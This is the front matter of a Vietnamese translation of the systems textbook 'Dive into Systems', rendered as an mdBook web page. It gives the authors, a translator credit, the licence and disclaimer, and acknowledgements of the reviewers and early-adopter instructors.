<!DOCTYPE HTML>
<html lang="vi" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Đắm mình vào hệ thống - Dive into Systems</title>
        <meta name="robots" content="noindex" />
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <!-- MathJax -->
        <script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="index.html"><strong aria-hidden="true">1.</strong> Home</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="copyright.html"><strong aria-hidden="true">1.1.</strong> Copyright</a></li><li class="chapter-item expanded "><a href="acknowledgements.html"><strong aria-hidden="true">1.2.</strong> Acknowledgements</a></li><li class="chapter-item expanded "><a href="preface.html"><strong aria-hidden="true">1.3.</strong> Preface</a></li></ol></li><li class="chapter-item expanded "><a href="introduction.html"><strong aria-hidden="true">2.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="C4-Binary/index.html"><strong aria-hidden="true">3.</strong> Binary and Data Representation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C4-Binary/bases.html"><strong aria-hidden="true">3.1.</strong> Number Bases and Unsigned Integers</a></li><li class="chapter-item expanded "><a href="C4-Binary/conversion.html"><strong aria-hidden="true">3.2.</strong> Converting Between Bases</a></li><li class="chapter-item expanded "><a href="C4-Binary/signed.html"><strong aria-hidden="true">3.3.</strong> Signed Binary Integers</a></li><li class="chapter-item expanded "><a href="C4-Binary/arithmetic.html"><strong aria-hidden="true">3.4.</strong> Binary Integer Arithmetic</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C4-Binary/arithmetic_addition.html"><strong aria-hidden="true">3.4.1.</strong> Addition</a></li><li class="chapter-item expanded "><a href="C4-Binary/arithmetic_subtraction.html"><strong aria-hidden="true">3.4.2.</strong> Subtraction</a></li><li class="chapter-item expanded "><a href="C4-Binary/arithmetic_mult_div.html"><strong aria-hidden="true">3.4.3.</strong> Multiplication & Division</a></li></ol></li><li class="chapter-item expanded "><a href="C4-Binary/overflow.html"><strong aria-hidden="true">3.5.</strong> Overflow</a></li><li class="chapter-item expanded "><a href="C4-Binary/bitwise.html"><strong aria-hidden="true">3.6.</strong> Bitwise Operators</a></li><li class="chapter-item expanded "><a href="C4-Binary/byte_order.html"><strong aria-hidden="true">3.7.</strong> Integer Byte Order</a></li><li class="chapter-item expanded "><a href="C4-Binary/floating_point.html"><strong aria-hidden="true">3.8.</strong> Real Numbers in Binary</a></li><li class="chapter-item expanded "><a href="C4-Binary/summary.html"><strong aria-hidden="true">3.9.</strong> Summary</a></li></ol></li><li class="chapter-item expanded "><a href="C5-Arch/index.html"><strong aria-hidden="true">4.</strong> What von Neumann Knew: Computer Architecture</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C5-Arch/hist.html"><strong aria-hidden="true">4.1.</strong> The Origins of Modern Computing</a></li><li class="chapter-item expanded "><a href="C5-Arch/von.html"><strong aria-hidden="true">4.2.</strong> The von Neumann Architecture</a></li><li class="chapter-item expanded "><a href="C5-Arch/gates.html"><strong aria-hidden="true">4.3.</strong> Logic Gates</a></li><li class="chapter-item expanded "><a href="C5-Arch/circuits.html"><strong aria-hidden="true">4.4.</strong> Circuits</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C5-Arch/arithlogiccircs.html"><strong aria-hidden="true">4.4.1.</strong> Arithmetic and Logic Circuits</a></li><li class="chapter-item expanded "><a href="C5-Arch/controlcircs.html"><strong aria-hidden="true">4.4.2.</strong> Control Circuits</a></li><li class="chapter-item expanded "><a href="C5-Arch/storagecircs.html"><strong aria-hidden="true">4.4.3.</strong> Storage Circuits</a></li></ol></li><li class="chapter-item expanded "><a href="C5-Arch/cpu.html"><strong aria-hidden="true">4.5.</strong> Building a Processor</a></li><li class="chapter-item expanded "><a href="C5-Arch/instrexec.html"><strong aria-hidden="true">4.6.</strong> The Processor’s Execution of Program Instructions</a></li><li class="chapter-item expanded "><a href="C5-Arch/pipelining.html"><strong aria-hidden="true">4.7.</strong> Pipelining Instruction Execution</a></li><li class="chapter-item expanded "><a href="C5-Arch/pipelining_advanced.html"><strong aria-hidden="true">4.8.</strong> Advanced Pipelining Considerations</a></li><li class="chapter-item expanded "><a href="C5-Arch/modern.html"><strong aria-hidden="true">4.9.</strong> Looking Ahead: CPUs Today</a></li><li class="chapter-item expanded "><a href="C5-Arch/summary.html"><strong aria-hidden="true">4.10.</strong> Summary</a></li></ol></li><li class="chapter-item expanded "><a href="C6-asm_intro/index.html"><strong aria-hidden="true">5.</strong> Under the C: Dive into Assembly</a></li><li class="chapter-item expanded "><a href="C7-x86_64/index.html"><strong aria-hidden="true">6.</strong> -bit x86 Assembly</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C7-x86_64/basics.html"><strong aria-hidden="true">6.1.</strong> Assembly Basics</a></li><li class="chapter-item expanded "><a href="C7-x86_64/common.html"><strong aria-hidden="true">6.2.</strong> Common Instructions</a></li><li class="chapter-item expanded "><a href="C7-x86_64/arithmetic.html"><strong aria-hidden="true">6.3.</strong> Additional Arithmetic Instructions</a></li><li class="chapter-item expanded "><a href="C7-x86_64/conditional_control_loops.html"><strong aria-hidden="true">6.4.</strong> Conditional Control and Loops</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C7-x86_64/preliminaries.html"><strong aria-hidden="true">6.4.1.</strong> Preliminaries</a></li><li class="chapter-item expanded "><a href="C7-x86_64/if_statements.html"><strong aria-hidden="true">6.4.2.</strong> If Statements</a></li><li class="chapter-item expanded "><a href="C7-x86_64/loops.html"><strong aria-hidden="true">6.4.3.</strong> Loops</a></li></ol></li><li class="chapter-item expanded "><a href="C7-x86_64/functions.html"><strong aria-hidden="true">6.5.</strong> Functions in Assembly</a></li><li class="chapter-item expanded "><a href="C7-x86_64/recursion.html"><strong aria-hidden="true">6.6.</strong> Recursion</a></li><li class="chapter-item expanded "><a href="C7-x86_64/arrays.html"><strong aria-hidden="true">6.7.</strong> Arrays in Assembly</a></li><li class="chapter-item expanded "><a href="C7-x86_64/matrices.html"><strong aria-hidden="true">6.8.</strong> Matrices in Assembly</a></li><li class="chapter-item expanded "><a href="C7-x86_64/structs.html"><strong aria-hidden="true">6.9.</strong> Structs in Assembly</a></li><li class="chapter-item expanded "><a href="C7-x86_64/buffer_overflow.html"><strong aria-hidden="true">6.10.</strong> Buffer Overflows</a></li></ol></li><li class="chapter-item expanded "><a href="C8-IA32/index.html"><strong aria-hidden="true">7.</strong> 64-bit x86 Assembly</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C8-IA32/basics.html"><strong aria-hidden="true">7.1.</strong> Assembly Basics</a></li><li class="chapter-item expanded "><a href="C8-IA32/common.html"><strong aria-hidden="true">7.2.</strong> Common Instructions</a></li><li class="chapter-item expanded "><a href="C8-IA32/arithmetic.html"><strong aria-hidden="true">7.3.</strong> Additional Arithmetic Instructions</a></li><li class="chapter-item expanded "><a href="C8-IA32/conditional_control_loops.html"><strong aria-hidden="true">7.4.</strong> Conditional Control and Loops</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C8-IA32/preliminaries.html"><strong aria-hidden="true">7.4.1.</strong> Preliminaries</a></li><li class="chapter-item expanded "><a href="C8-IA32/if_statements.html"><strong aria-hidden="true">7.4.2.</strong> If Statements</a></li><li class="chapter-item expanded "><a href="C8-IA32/loops.html"><strong aria-hidden="true">7.4.3.</strong> Loops</a></li></ol></li><li class="chapter-item expanded "><a href="C8-IA32/functions.html"><strong aria-hidden="true">7.5.</strong> Functions in Assembly</a></li><li class="chapter-item expanded "><a href="C8-IA32/recursion.html"><strong aria-hidden="true">7.6.</strong> Recursion</a></li><li class="chapter-item expanded "><a href="C8-IA32/arrays.html"><strong aria-hidden="true">7.7.</strong> Arrays in Assembly</a></li><li class="chapter-item expanded "><a href="C8-IA32/matrices.html"><strong aria-hidden="true">7.8.</strong> Matrices in Assembly</a></li><li class="chapter-item expanded "><a href="C8-IA32/structs.html"><strong aria-hidden="true">7.9.</strong> Structs in Assembly</a></li><li class="chapter-item expanded "><a href="C8-IA32/buffer_overflow.html"><strong aria-hidden="true">7.10.</strong> Buffer Overflows</a></li></ol></li><li class="chapter-item expanded "><a href="C9-ARM64/index.html"><strong aria-hidden="true">8.</strong> ARMv8 Assembly</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C9-ARM64/basics.html"><strong aria-hidden="true">8.1.</strong> Assembly Basics</a></li><li class="chapter-item expanded "><a href="C9-ARM64/common.html"><strong aria-hidden="true">8.2.</strong> Common Instructions</a></li><li class="chapter-item expanded "><a href="C9-ARM64/arithmetic.html"><strong aria-hidden="true">8.3.</strong> Arithmetic Instructions</a></li><li class="chapter-item expanded "><a href="C9-ARM64/conditional_control_loops.html"><strong aria-hidden="true">8.4.</strong> Conditional Control and Loops</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C9-ARM64/preliminaries.html"><strong aria-hidden="true">8.4.1.</strong> Preliminaries</a></li><li class="chapter-item expanded "><a href="C9-ARM64/if_statements.html"><strong aria-hidden="true">8.4.2.</strong> If Statements</a></li><li class="chapter-item expanded "><a href="C9-ARM64/loops.html"><strong aria-hidden="true">8.4.3.</strong> Loops</a></li></ol></li><li class="chapter-item expanded "><a href="C9-ARM64/functions.html"><strong aria-hidden="true">8.5.</strong> Functions in Assembly</a></li><li class="chapter-item expanded "><a href="C9-ARM64/recursion.html"><strong aria-hidden="true">8.6.</strong> Recursion</a></li><li class="chapter-item expanded "><a href="C9-ARM64/arrays.html"><strong aria-hidden="true">8.7.</strong> Arrays in Assembly</a></li><li class="chapter-item expanded "><a href="C9-ARM64/matrices.html"><strong aria-hidden="true">8.8.</strong> Matrices in Assembly</a></li><li class="chapter-item expanded "><a href="C9-ARM64/structs.html"><strong aria-hidden="true">8.9.</strong> Structs in Assembly</a></li><li class="chapter-item expanded "><a href="C9-ARM64/buffer_overflow.html"><strong aria-hidden="true">8.10.</strong> Buffer Overflows</a></li></ol></li><li class="chapter-item expanded "><a href="C10-asm_takeaways/index.html"><strong aria-hidden="true">9.</strong> Key Assembly Takeaways</a></li><li class="chapter-item expanded "><a href="C11-MemHierarchy/index.html"><strong aria-hidden="true">10.</strong> Storage and the Memory Hierarchy</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C11-MemHierarchy/mem_hierarchy.html"><strong aria-hidden="true">10.1.</strong> The Memory Hierarchy</a></li><li class="chapter-item expanded "><a href="C11-MemHierarchy/devices.html"><strong aria-hidden="true">10.2.</strong> Storage Devices</a></li><li class="chapter-item expanded "><a href="C11-MemHierarchy/locality.html"><strong aria-hidden="true">10.3.</strong> Locality</a></li><li class="chapter-item expanded "><a href="C11-MemHierarchy/caching.html"><strong aria-hidden="true">10.4.</strong> Caching</a></li><li class="chapter-item expanded "><a href="C11-MemHierarchy/cachegrind.html"><strong aria-hidden="true">10.5.</strong> Cache Analysis and Cachegrind</a></li><li class="chapter-item expanded "><a href="C11-MemHierarchy/coherency.html"><strong aria-hidden="true">10.6.</strong> Looking Ahead: Caching on Multicore Processors</a></li><li class="chapter-item expanded "><a href="C11-MemHierarchy/summary.html"><strong aria-hidden="true">10.7.</strong> Summary</a></li></ol></li><li class="chapter-item expanded "><a href="C12-CodeOpt/index.html"><strong aria-hidden="true">11.</strong> Code Optimization</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C12-CodeOpt/basic.html"><strong aria-hidden="true">11.1.</strong> First Steps</a></li><li class="chapter-item expanded "><a href="C12-CodeOpt/loops_functions.html"><strong aria-hidden="true">11.2.</strong> Other Compiler Optimizations</a></li><li class="chapter-item expanded "><a href="C12-CodeOpt/memory_considerations.html"><strong aria-hidden="true">11.3.</strong> Memory Considerations</a></li><li class="chapter-item expanded "><a href="C12-CodeOpt/summary.html"><strong aria-hidden="true">11.4.</strong> Summary</a></li></ol></li><li class="chapter-item expanded "><a href="C13-OS/index.html"><strong aria-hidden="true">12.</strong> The Operating System</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C13-OS/impl.html"><strong aria-hidden="true">12.1.</strong> Booting and Running</a></li><li class="chapter-item expanded "><a href="C13-OS/processes.html"><strong aria-hidden="true">12.2.</strong> Processes</a></li><li class="chapter-item expanded "><a href="C13-OS/vm.html"><strong aria-hidden="true">12.3.</strong> Virtual Memory</a></li><li class="chapter-item expanded "><a href="C13-OS/ipc.html"><strong aria-hidden="true">12.4.</strong> Interprocess Communication</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C13-OS/ipc_signals.html"><strong aria-hidden="true">12.4.1.</strong> Signals</a></li><li class="chapter-item expanded "><a href="C13-OS/ipc_msging.html"><strong aria-hidden="true">12.4.2.</strong> Message Passing</a></li><li class="chapter-item expanded "><a href="C13-OS/ipc_shm.html"><strong aria-hidden="true">12.4.3.</strong> Shared Memory</a></li></ol></li><li class="chapter-item expanded "><a href="C13-OS/advanced.html"><strong aria-hidden="true">12.5.</strong> Summary and Other OS Functionality</a></li></ol></li><li class="chapter-item expanded "><a href="C14-SharedMemory/index.html"><strong aria-hidden="true">13.</strong> Leveraging Shared Memory in the Multicore Era</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C14-SharedMemory/multicore.html"><strong aria-hidden="true">13.1.</strong> Programming Multicore Systems</a></li><li class="chapter-item expanded "><a href="C14-SharedMemory/posix.html"><strong aria-hidden="true">13.2.</strong> POSIX Threads</a></li><li class="chapter-item expanded "><a href="C14-SharedMemory/synchronization.html"><strong aria-hidden="true">13.3.</strong> Synchronizing Threads</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C14-SharedMemory/mutex.html"><strong aria-hidden="true">13.3.1.</strong> Mutual Exclusion</a></li><li class="chapter-item expanded "><a href="C14-SharedMemory/semaphores.html"><strong aria-hidden="true">13.3.2.</strong> Semaphores</a></li><li class="chapter-item expanded "><a href="C14-SharedMemory/other_syncs.html"><strong aria-hidden="true">13.3.3.</strong> Other Synchronization Constructs</a></li></ol></li><li class="chapter-item expanded "><a href="C14-SharedMemory/performance.html"><strong aria-hidden="true">13.4.</strong> Measuring Parallel Performance</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C14-SharedMemory/performance_basics.html"><strong aria-hidden="true">13.4.1.</strong> Parallel Performance Basics</a></li><li class="chapter-item expanded "><a href="C14-SharedMemory/performance_advanced.html"><strong aria-hidden="true">13.4.2.</strong> Advanced Topics</a></li></ol></li><li class="chapter-item expanded "><a href="C14-SharedMemory/cache_coherence.html"><strong aria-hidden="true">13.5.</strong> Cache Coherence</a></li><li class="chapter-item expanded "><a href="C14-SharedMemory/thread_safety.html"><strong aria-hidden="true">13.6.</strong> Thread Safety</a></li><li class="chapter-item expanded "><a href="C14-SharedMemory/openmp.html"><strong aria-hidden="true">13.7.</strong> Implicit Threading with OpenMP</a></li><li class="chapter-item expanded "><a href="C14-SharedMemory/summary.html"><strong aria-hidden="true">13.8.</strong> Summary</a></li></ol></li><li class="chapter-item expanded "><a href="C15-Parallel/index.html"><strong aria-hidden="true">14.</strong> Looking Ahead: Other Parallel Systems</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C15-Parallel/gpu.html"><strong aria-hidden="true">14.1.</strong> Hardware Acceleration and CUDA</a></li><li class="chapter-item expanded "><a href="C15-Parallel/distrmem.html"><strong aria-hidden="true">14.2.</strong> Distributed Memory Systems</a></li><li class="chapter-item expanded "><a href="C15-Parallel/cloud.html"><strong aria-hidden="true">14.3.</strong> To Exascale and Beyond</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Đắm mình vào hệ thống - Dive into Systems</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="Đắm-mình-vào-hệ-thống"><a class="header" href="#Đắm-mình-vào-hệ-thống">Đắm mình vào hệ thống</a></h1>
<h2 id="tác-giả"><a class="header" href="#tác-giả">Tác giả</a></h2>
<p>Suzanne J. Matthews, Ph.D.  ( West Point) - <a href="mailto:suzanne.matthews@westpoint.edu">suzanne.matthews@westpoint.edu</a></p>
<p>Tia Newhall, Ph.D. ( Swarthmore College) - <a href="mailto:newhall@cs.swarthmore.edu">newhall@cs.swarthmore.edu</a></p>
<p>Kevin C. Webb, Ph.D. ( Swarthmore College) - <a href="mailto:kwebb@cs.swarthmore.edu">kwebb@cs.swarthmore.edu</a></p>
<h2 id="dịch-giả"><a class="header" href="#dịch-giả">Dịch giả</a></h2>
<p>Copilot, chứ không phải tôi.</p>
<h2 id="biên-tập-viên"><a class="header" href="#biên-tập-viên">Biên tập viên</a></h2>
<p>Chính là tôi.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="giấy-phép-cc-by-nc-nd-40"><a class="header" href="#giấy-phép-cc-by-nc-nd-40">Giấy phép: CC BY-NC-ND 4.0</a></h1>
<p>Tác phẩm này được phát hành theo <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/">Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International</a>.</p>
<p><a href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img src="_images/copyright.png" alt="Giấy phép Creative Commons BY-NC-ND" /></a></p>
<h2 id="miễn-trừ-trách-nhiệm-disclaimer"><a class="header" href="#miễn-trừ-trách-nhiệm-disclaimer">Miễn trừ trách nhiệm (Disclaimer)</a></h2>
<p>Các tác giả đã nỗ lực hết sức để đảm bảo rằng thông tin trong cuốn sách này là chính xác. Các chương trình trong sách chỉ được đưa vào với mục đích giảng dạy. Các tác giả không đưa ra bất kỳ bảo đảm nào liên quan đến các chương trình hoặc nội dung của cuốn sách này. Các tác giả không chịu và theo đây từ chối mọi trách nhiệm đối với bất kỳ bên nào về mọi tổn thất, thiệt hại hoặc gián đoạn gây ra bởi lỗi hoặc thiếu sót, dù những lỗi hoặc thiếu sót đó xuất phát từ sơ suất, tai nạn hay bất kỳ nguyên nhân nào khác.</p>
<p>Những quan điểm được trình bày trong cuốn sách này là của riêng các tác giả và không phản ánh chính sách hoặc lập trường chính thức của Bộ Lục quân Hoa Kỳ, Bộ Quốc phòng Hoa Kỳ, hay Chính phủ Hoa Kỳ.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="lời-cảm-ơn"><a class="header" href="#lời-cảm-ơn">Lời cảm ơn</a></h1>
<p>Các tác giả xin trân trọng ghi nhận và cảm ơn những cá nhân sau đây đã góp phần giúp <em>Dive into Systems</em> trở thành một thành công:</p>
<h2 id="người-phản-biện-chính-thức"><a class="header" href="#người-phản-biện-chính-thức">Người phản biện chính thức</a></h2>
<p>Mỗi chương trong <em>Dive into Systems</em> đều được phản biện bởi nhiều giảng viên ngành Khoa học Máy tính (CS) tại các trường đại học trên khắp Hoa Kỳ. Chúng tôi vô cùng biết ơn các giảng viên đã đảm nhận vai trò phản biện chính thức. Những ý kiến sâu sắc, thời gian và khuyến nghị của quý vị đã giúp nâng cao tính chặt chẽ và độ chính xác của <em>Dive into Systems</em>. Cụ thể, chúng tôi xin ghi nhận đóng góp của:</p>
<ul>
<li>Jeannie Albrecht (Williams College) – phản biện và góp ý cho Chương 15.</li>
<li>John Barr (Ithaca College) – phản biện và góp ý cho Chương 6, 7, 8, đồng thời đưa ra lời khuyên chung cho chương về x86_64.</li>
<li>Jon Bentley – phản biện và góp ý cho Mục 5.1, bao gồm cả chỉnh sửa câu chữ.</li>
<li>Anu G. Bourgeois (Georgia State University) – phản biện và góp ý cho Chương 4.</li>
<li>Martina Barnas (Indiana University Bloomington) – phản biện và góp ý sâu sắc cho Chương 14, đặc biệt là Mục 14.4.</li>
<li>David Bunde (Knox College) – phản biện, bình luận và đề xuất cho Chương 14.</li>
<li>Stephen Carl (Sewanee: The University of the South) – phản biện cẩn thận và góp ý chi tiết cho Chương 6 và 7.</li>
<li>Bryan Chin (U.C. San Diego) – phản biện sâu sắc cho chương về hợp ngữ ARM (Chương 9).</li>
<li>Amy Csizmar Dalal (Carleton College) – phản biện và góp ý cho Chương 5.</li>
<li>Debzani Deb (Winston-Salem State University) – phản biện và góp ý cho Chương 11.</li>
<li>Saturnino Garcia (University of San Diego) – phản biện và góp ý cho Chương 5.</li>
<li>Tim Haines (University of Wisconsin) – bình luận và phản biện cho Chương 3.</li>
<li>Bill Jannen (Williams College) – phản biện chi tiết và góp ý sâu sắc cho Chương 11.</li>
<li>Ben Marks (Swarthmore College) – góp ý cho Chương 1 và 2.</li>
<li>Alexander Mentis (West Point) – góp ý sâu sắc và chỉnh sửa câu chữ cho các bản thảo sớm của sách.</li>
<li>Rick Ord (U.C. San Diego) – phản biện và đề xuất chỉnh sửa cho Lời nói đầu, đồng thời phản biện hơn 60% (!!) nội dung sách, bao gồm Chương 0, 1, 2, 3, 4, 6, 7, 8 và 14. Phản hồi của ông đã giúp chúng tôi duy trì sự thống nhất về ký hiệu và mã nguồn giữa các chương.</li>
<li>Joe Politz (U.C. San Diego) – phản biện và đề xuất chi tiết nhằm củng cố Chương 12.</li>
<li>Brad Richards (University of Puget Sound) – phản hồi nhanh chóng và đề xuất cho Chương 12.</li>
<li>Kelly Shaw (Williams College) – phản biện và đề xuất cho Chương 15.</li>
<li>Simon Sultana (Fresno Pacific University) – phản biện và đề xuất chỉnh sửa cho Chương 1.</li>
<li>Cynthia Taylor (Oberlin College) – phản biện và đề xuất chỉnh sửa cho Chương 13.</li>
<li>David Toth (Centre College) – phản biện và đề xuất chỉnh sửa cho Chương 2 và 14.</li>
<li>Bryce Wiedenbeck (Davidson College) – phản biện và đề xuất chỉnh sửa cho Chương 4.</li>
<li>Daniel Zingaro (University of Toronto Mississauga) – phát hiện <em>rất nhiều</em> lỗi chính tả.</li>
</ul>
<h2 id="phản-hồi-bổ-sung"><a class="header" href="#phản-hồi-bổ-sung">Phản hồi bổ sung</a></h2>
<p>Những cá nhân sau đây đã phát hiện các lỗi chính tả ngẫu nhiên và những chi tiết nhỏ khác. Chúng tôi rất biết ơn sự giúp đỡ của các bạn trong việc tìm ra những lỗi này:</p>
<ul>
<li>Kevin Andrea (George Mason University)</li>
<li>Tanya Amert (Denison University)</li>
<li>Ihor Beliuha</li>
<li>Christiaan Biesterbosch</li>
<li>Daniel Canas (Wake Forest University)</li>
<li>Chien-Chung Shen (University of Delaware)</li>
<li>Vasanta Chaganti (Swarthmore College)</li>
<li>Stephen Checkoway (Oberlin College)</li>
<li>John DeGood (The College of New Jersey)</li>
<li>Joe Errey</li>
<li>Artin Farahani</li>
<li>Sat Garcia (University of San Diego)</li>
<li>Aaron Gember-Jacobson (Colgate University)</li>
<li>Stephen Gilbert</li>
<li>Arina Kazakova (Swarthmore College)</li>
<li>Akiel Khan</li>
<li>Deborah Knox (The College of New Jersey)</li>
<li>Kevin Lahey (Colgate University)</li>
<li>Raphael Matchen</li>
<li>Sivan Nachaum (Smith College)</li>
<li>Aline Normolye (Bryn Mawr College)</li>
<li>SaengMoung Park (Swarthmore College)</li>
<li>Rodrigo Piovezan (Swarthmore College)</li>
<li>Roy Ragsdale (West Point) – tư vấn về việc tái cấu trúc trò chơi đoán số cho phần khai thác tràn bộ đệm ARM trong Chương 9.<br />
Zachary Robinson (Swarthmore College)</li>
<li>Joel Sommers (Colgate University)</li>
<li>Peter Stenger<br />
Richard Weiss (Evergreen State College)</li>
<li>David Toth (Centre College)</li>
<li>Alyssa Zhang (Swarthmore College)</li>
</ul>
<h2 id="những-người-dùng-sớm-early-adopters"><a class="header" href="#những-người-dùng-sớm-early-adopters">Những người dùng sớm (Early Adopters)</a></h2>
<p>Phiên bản alpha của <em>Dive into Systems</em> được thử nghiệm tại West Point vào mùa Thu 2018; phiên bản beta được thử nghiệm tại West Point và Swarthmore College vào mùa Xuân 2019. Đến mùa Thu 2019, <em>Dive into Systems</em> khởi động Chương trình Người dùng sớm (Early Adopter Program), cho phép các giảng viên trên khắp Hoa Kỳ thử nghiệm phiên bản ổn định của sách tại trường mình. Chương trình này đã hỗ trợ rất nhiều cho nhóm tác giả, giúp chúng tôi thu thập những hiểu biết quý giá về trải nghiệm của sinh viên và giảng viên với giáo trình. Chúng tôi sử dụng phản hồi nhận được để cải thiện và củng cố nội dung sách, và vô cùng biết ơn tất cả những ai đã hoàn thành khảo sát của chúng tôi.</p>
<h3 id="người-dùng-sớm-20192020"><a class="header" href="#người-dùng-sớm-20192020">Người dùng sớm 2019–2020</a></h3>
<p>Những cá nhân sau đã sử dụng <em>Dive into Systems</em> làm giáo trình tại trường mình trong năm học 2019–2020:</p>
<ul>
<li>John Barr (Ithaca College) – Computer Organization &amp; Assembly Language (Comp 210)</li>
<li>Chris Branton (Drury University) – Computer Systems Concepts (CSCI 342)</li>
<li>Dick Brown (St. Olaf College) – Hardware Design (CSCI 241)</li>
<li>David Bunde (Knox College) – Introduction to Computing Systems (CS 214)</li>
<li>Bruce Char (Drexel University) – Systems Programming (CS 283)</li>
<li>Vasanta Chaganti (Swarthmore College) – Introduction to Computer Systems (CS 31)</li>
<li>Bryan Chin (U.C. San Diego) – Computer Organization and Systems Programming (CSE 30)</li>
<li>Stephen Carl (Sewanee: The University of the South) – Computer Systems and Organization (CSci 270)</li>
